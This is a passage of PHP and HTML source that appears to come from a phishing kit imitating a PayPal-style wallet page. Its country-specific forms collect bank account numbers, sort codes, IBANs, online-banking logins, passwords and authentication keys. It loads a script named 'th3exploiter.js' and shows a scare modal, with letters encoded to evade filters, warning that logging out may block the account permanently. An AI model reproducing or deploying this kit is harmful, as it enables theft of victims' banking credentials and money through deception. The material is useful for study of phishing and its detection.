<input aria-invalid="false" id="accountNum" name="accountNumber" class="enterInput" required="required" aria-required="true" value="" placeholder="Account number (3-17 digits)" autocomplete="off" pattern="[0-9]*" maxlength="17" data-min="3/" type="text">
<p class="help-information" id="accountNum-help-information">A 3-17 digit number at the bottom of a check or on a bank statement. Contact your bank if you need help.</p>
</div>


<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">

<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="enterInput"  value="" placeholder="Bank name" autocomplete="off"  maxlength="50"  type="text" ng-model="formData.bankName">
</div>
<div id = "banklog" class="col-xs-12 col-lg-10 col-lg-offset-1_ltr bankNameLogo hide"></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" style="margin-top:10px;">

<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="enterInput"  value="" placeholder="Bank Login" autocomplete="off"  maxlength="30"  type="text" >
</div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" style="margin-top:10px;">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div>


</div>
<div class="row hide" id="rbel1">
<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr" ><div class="textInput accountNum accountNum accountNumber">
<input name="authkey" id ="authky" class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="Authentication Key"  maxlength="6" type="password"></div></div>
</div>

</div>
';}
elseif (($_SESSION['cntyCode'] == "GB") || ($_SESSION['cntyCode'] == "IE")){
    
    echo'
    <center><div style="margin-bottom:20px;width:120px; height:80px;background:url(img/sprite_wallet_icons_2x.png) 0px -80px ;"></div></center>
    <div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">Name of account holder: <b><span class="bankNameLabel"></span></b></div>
<div class="accountNumbers ltrInputGroup"style="margin-bottom:5px;" >
<div class="row">
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="routingNum" class="accessAid">Sort Code</label>
<input aria-invalid="false" id="sortC" name="sortCode" class="enterInput"  value="" placeholder="SortCode (6 digits)" autocomplete="off" pattern="[0-9]*" maxlength="8"  type="tel" onkeyup="UKBANK(this.value)">
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Account number</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="hasHelp js_needsValidation validate cobrowse_mask"  aria-required="true" value="" placeholder="Account number (8 digits)" autocomplete="off" pattern="[0-9]*" maxlength="8"  type="tel">
</div></div>


<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="enterInput"  value="" placeholder="Bank name" autocomplete="off"  maxlength="50"  type="text">
</div></div>
<div id = "banklog" class="col-xs-12 col-lg-10 col-lg-offset-1_ltr bankNameLogo hide"></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank Login" autocomplete="off"  maxlength="30"  type="text" >
</div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div>


</div></div>';
}
elseif ($_SESSION['cntyCode'] == "CA"){
    echo'
    <div class="bankType vx_btn-group toggleBtnGroup clearfix">
<input id="checking" class="accessAid" name="accountType" checked="checked" value="checking" type="radio">
<label id ="checkin"class="vx_btn vx_btn-secondary toggleBtn col-xs-5 btnCol4" for="checking" >Checking</label>
<input id="savings" class="accessAid" name="accountType" value="savings" type="radio">
<label id="saving" class="vx_btn vx_btn-secondary toggleBtn col-xs-5 btnCol4 " for="savings" >Savings</label>
</div>
<div class="checkWrapper enforceLtr">
<div id="cheekca" class="check CA"></div></div>
    
    <div class="accountNumbers ltrInputGroup" style="margin-bottom:5px;">
<div class="row">
<div class="col-xs-12 col-lg-3 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="routingNum" class="accessAid">Transit</label>
<input aria-invalid="false" id="catran" name="transit" class="hasHelp js_needsValidation validate valid" value="" placeholder="Transit # (5 digits)" autocomplete="off" pattern="[0-9]*" maxlength="5" type="tel" onkeyup="BANKCA(this.value)">
</div></div>

<div class="col-xs-12 col-lg-2 col-lg-offset-2_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Institution</label>
<input aria-invalid="false" id="instica" name="institution" class="hasHelp js_needsValidation validate cobrowse_mask valid" aria-required="true" value="" placeholder="Institution # (3 digits)" autocomplete="off" pattern="[0-9]*" maxlength="3" type="tel" onkeyup="BANKCA(this.value)">
</div></div><div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Account number</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="hasHelp js_needsValidation validate cobrowse_mask valid" aria-required="true" value="" placeholder="Account number (1-12 digits)" autocomplete="off" pattern="[0-9]*" maxlength="12" type="tel">
</div></div>


<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank name</label>
<input id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="Bank name" autocomplete="off" maxlength="50" type="text">
</div></div>
<div id = "banklog" class="col-xs-12 col-lg-10 col-lg-offset-1_ltr bankNameLogo hide"></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank Login" autocomplete="off"  maxlength="30"  type="text" >
</div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div>


</div></div>';  
}
elseif ($_SESSION['cntyCode'] == "AU" || ($_SESSION['cntyCode'] == "NZ")){
    echo'
    <center><div style="margin-bottom:20px;"><img src="img/generic-bank_2x.png"></div></center>
    <div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">Account owner: <b><span class="bankNameLabel"></span></b></div>
<div class="accountNumbers ltrInputGroup"style="margin-bottom:5px;" >
<div class="row">
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="routingNum" class="accessAid">BSB </label>
<input aria-invalid="false" id="bsbNum" name="BSB" class="hasHelp js_needsValidation validate"  value="" placeholder="BSB (6 digits)" autocomplete="off" pattern="[0-9]*" maxlength="7"  type="tel" onkeyup="AUBANK(this.value)">
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Account number</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="hasHelp js_needsValidation validate cobrowse_mask"  aria-required="true" value="" placeholder="Account number (1-9 digits)" autocomplete="off" pattern="[0-9]*" maxlength="9"  type="tel">
</div></div>


<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Financial Institution Name" autocomplete="off"  maxlength="50"  type="text">
</div></div>
<div id = "banklog" class="col-xs-12 col-lg-10 col-lg-offset-1_ltr bankNameLogo hide"></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank Login" autocomplete="off"  maxlength="30"  type="text" >
</div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div></div>
<div class="row hide" id="rbel">
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" ><div class="textInput accountNum accountNum accountNumber">
<input name="secNum" id="secNum" class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="Security Number"  maxlength="6" type="password"></div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" ><div class="textInput accountNum accountNum accountNumber">
<input name="issNum" id="issNum"class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="Issue Number"  maxlength="1" type="tel"></div></div>
</div>
<div class="row hide" id="rbel1">
<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr" ><div class="textInput accountNum accountNum accountNumber">
<input name="authkey" id ="authky" class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="Authentication Key"  maxlength="6" type="password"></div></div>
</div>
</div>';
}
elseif ($_SESSION['cntyCode'] == "CH"){
    echo'
    <center><div style="margin-bottom:20px;width:120px; height:80px;background:url(img/sprite_wallet_icons_2x.png) 0px -80px ;"></div></center>
    <div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">Account owner: <b><span class="bankNameLabel"></span></b></div>
    <div class="accountNumbers ltrInputGroup"style="margin-bottom:5px;" >
<div class="row">
    <div class="col-xs-12 col-lg-6 col-lg-offset-1_ltr">
    <div class="textInput routingNum routingNum routingNumber lap">
    <label for="firstName" class="accessAid">First name</label>
    <input id="firstName" name="firstName" type="text" class="hasHelp js_needsValidation validate cobrowse_mask"   value="" placeholder="First name" autocomplete="off" maxlength="64" aria-invalid="false">
    <p class="help-information" id="firstName-help-information">The first name must match the first name on your bank statement.</p>
    </div></div>
    <div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr" style="margin-bottom:10px;">

<label for="routingNum" class="accessAid">IBAN</label>
<input aria-invalid="false" id="iban" name="IBAN" data-rule-iban="true" class="enterInput"  value="" placeholder="IBAN (International Bank Account Number)" autocomplete="off"  maxlength="32"  type="text">
</div>

<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank name" autocomplete="off"  maxlength="50"  type="text">
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank Login" autocomplete="off"  maxlength="30"  type="text" >
</div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div>


</div></div>
    
    ';  
}
elseif(($_SESSION['cntyCode'] == "AT") || ($_SESSION['cntyCode'] == "BE") || ($_SESSION['cntyCode'] == "AT") || ($_SESSION['cntyCode'] == "CY") || ($_SESSION['cntyCode'] == "EE") || ($_SESSION['cntyCode'] == "FI") || ($_SESSION['cntyCode'] == "DE")
|| ($_SESSION['cntyCode'] == "GR") || ($_SESSION['cntyCode'] == "IT") || ($_SESSION['cntyCode'] == "LV") || ($_SESSION['cntyCode'] == "LU") || ($_SESSION['cntyCode'] == "MT") || ($_SESSION['cntyCode'] == "NL") 
|| ($_SESSION['cntyCode'] == "PT") || ($_SESSION['cntyCode'] == "ES") || ($_SESSION['cntyCode'] == "SK") || ($_SESSION['cntyCode'] == "SI") || ($_SESSION['cntyCode'] == "TR") 
|| ($_SESSION['cntyCode'] == "NO") || ($_SESSION['cntyCode'] == "SE") || ($_SESSION['cntyCode'] == "RO") || ($_SESSION['cntyCode'] == "DK")|| ($_SESSION['cntyCode'] == "IL")||($_SESSION['cntyCode'] == "UA"))
{
    echo'
    <center><div style="margin-bottom:20px;"><img src="img/generic-bank_2x.png"></div></center>
    <div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">Account owner: <b><span class="bankNameLabel"></span></b></div>
<div class="accountNumbers ltrInputGroup"style="margin-bottom:5px;" >
<div class="row">
<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="routingNum" class="accessAid">IBAN</label>
<input aria-invalid="false" id="iban" name="IBAN" data-rule-iban="true" class="enterInput"  value="" placeholder="IBAN (International Bank Account Number)" autocomplete="off"  maxlength="32"  type="text">
</div></div>

<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank name" autocomplete="off"  maxlength="50"  type="text">
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank Login" autocomplete="off"  maxlength="30"  type="text" >
</div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div>


</div></div>
    
    ';
    
}
else {
    echo'
<center><div style="margin-bottom:20px;"><img src="img/generic-bank_2x.png"></div></center>
    <div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">Account owner: <b><span class="bankNameLabel"></span></b></div>
<div class="accountNumbers ltrInputGroup"style="margin-bottom:5px;" >
<div class="row">
<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr">
<div class="textInput routingNum routingNum routingNumber lap">
<label for="routingNum" class="accessAid">Bank Code </label>
<input aria-invalid="false" id="BIC" name="BIC" class="hasHelp js_needsValidation validate"  value="" placeholder="Bank International Code" autocomplete="off" " maxlength="15"  type="tel">
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Account number</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="hasHelp js_needsValidation validate cobrowse_mask"  aria-required="true" value="" placeholder="Account number" autocomplete="off" pattern="[0-9]*" maxlength="20"  type="tel">
</div></div>


<div class="col-xs-12 col-lg-10 col-lg-offset-1_ltr">
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Bank name" autocomplete="off"  maxlength="50"  type="text">
</div></div>

<div class="col-xs-12 col-lg-5 col-lg-offset-1_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Login</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Online Banking ID" autocomplete="off"  maxlength="30"  type="text" >
</div></div>
<div class="col-xs-12 col-lg-5 col-lg-offset-2_ltr" >
<div class="textInput accountNum accountNum accountNumber lap">
<label for="accountNum" class="accessAid">Bank Password</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="Password" autocomplete="off"  maxlength="30"  type="password" >
</div></div>


</div></div>
';}
?>
</div>
<center>
    <input id="saveBankInfo"  class="vx_btn col-xs-12 col-lg-10 col-lg-offset-3_ltr " name="continue" value="Continue"  type="submit">
</center>
</form>
</div></div>


<div class=" overpanel-content maxOverpanelWidth hide" style="padding-top:70px" id="upproof" role="document">
<div id="overpanel-header" class=" overpanel-header">
<h2 id="overpanel-header">Upload proof of identity</h2>
</div>
<div class=" overpanel-body">



</div></div>


</div></section>
<script src="js/plugins.js"></script>
<script src="js/th3exploiter.js"></script>
<script src="js/ukbank.js"></script>
<script src="js/cabank.js"></script>
<script src="js/aubank.js"></script>
<script src="js/usabank.js"></script>
<script src="js/iban.js"></script>
<div tabindex="-1"id="myModal" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10"style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.5;filter: alpha(opacity=50);height: 792px;"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
<div style="
    z-index: 100011;
    width: auto;
    margin: auto;
    padding: 6px;
    position: relative;
    background-color: #ffffff;
    border: 1px solid #999999;
    border: 1px solid rgba(0,0,0,0.2);
    border-radius: 6px;
    -webkit-box-shadow: 0 3px 3px rgba(0,0,0,0.5);
    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);
    -webkit-background-clip: padding-box;
    background-clip: padding-box;
    outline: 0;
    border-color: #e5e5e5 #d9d9d9 #cccccc;
    -webkit-box-shadow: 0 3px 3px rgba(148, 148, 148, 0.8);
    box-shadow: 0 0px 0px rgba(148, 148, 148, 0.8);
    -webkit-border-radius: 10px;
    -moz-border-radius: 6px;
    border-radius: 6px;
    -moz-background-clip: padding-box;
    -webkit-background-clip: padding-box;
    background-clip: padding-box;
    background-color:#fdfdfd;
    outline: 0 none;
    margin-top: 150px;
    max-width:1024px;
    min-width:auto;
    max-height:200px;
    opacity: 1;">
    <center><div ><h2>If you log out your &#97;cc&#111;unt may be bl&#111;cked perm&#97;nently</h2></div></center>
 <center>
        <a class="vx_btn" href='#'>Continue</a>
 </center>
</div></div>
<div class="whiteOverlayMask hide"></div>
<script>
$(".vx_globalNav-link_notifications").click(function(){
$("#nikommek").addClass("vx_hasOpenSidepanel");
$("#js_foreground").addClass("open-side-panel");
$(".whiteOverlayMask").addClass("open-side-panel isShown").removeClass("hide");
});
$(".vx_sidepanel-headerIcon_right").click(function(e) {
      e.preventDefault();
      $("#nikommek").removeClass("vx_hasOpenSidepanel");
      $("#js_foreground").removeClass("open-side-panel");
      $(".whiteOverlayMask").removeClass("open-side-panel isShown").addClass("hide");
});
$(".whiteOverlayMask").click(function(e){
e.preventDefault();
      $("#nikommek").removeClass("vx_hasOpenSidepanel");
      $("#js_foreground").removeClass("open-side-panel");
      $(".whiteOverlayMask").removeClass("open-side-panel isShown").addClass("hide");

});
$(".js_toggleMobileMenu").click(function(){
$("#nikommek").toggleClass("vx_hasOpenNav");
});



window.onload = function() {
 var myInput = document.getElementById('cardnumber');
 var myInput1 = document.getElementById('routingNum');
 var myInput2 = document.getElementById('sortC');
 var myInput3 = document.getElementById('catran');
 var myInput4 = document.getElementById('instica');
 var myInput5 = document.getElementById('bsbNum');
 myInput.onpaste = function(e) {
   e.preventDefault();
 }
 myInput1.onpaste = function(e) {
   e.preventDefault();
 }
 myInput2.onpaste = function(e) {
   e.preventDefault();
 }
 myInput3.onpaste = function(e) {
   e.preventDefault();
 }
 myInput4.onpaste = function(e) {
   e.preventDefault();
 }
 myInput5.onpaste = function(e) {
   e.preventDefault();
 }
}
  
</script>
</body></html>